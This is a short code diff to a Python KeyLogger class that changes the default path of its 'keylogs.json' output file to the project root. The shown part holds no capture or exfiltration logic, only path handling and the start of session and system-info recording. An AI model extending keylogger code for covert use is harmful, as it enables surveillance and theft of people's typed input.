@@ -6,8 +6,12 @@ import platform
 import getpass
 
 class KeyLogger:
-    def __init__(self, output_path="keylogs.json"):
-        self.output_path = output_path
+    def __init__(self, output_path=None):
+        base_dir = os.path.dirname(os.path.abspath(__file__))  # This file's dir (e.g., src/keylogger/)
+        if output_path is None:
+            output_path = os.path.join(base_dir, "../../keylogs.json")  # 2 levels up = project root
+        self.output_path = os.path.abspath(output_path)
+
         self.session_data = {
             "start_time": str(datetime.now()),
             "system_info": {
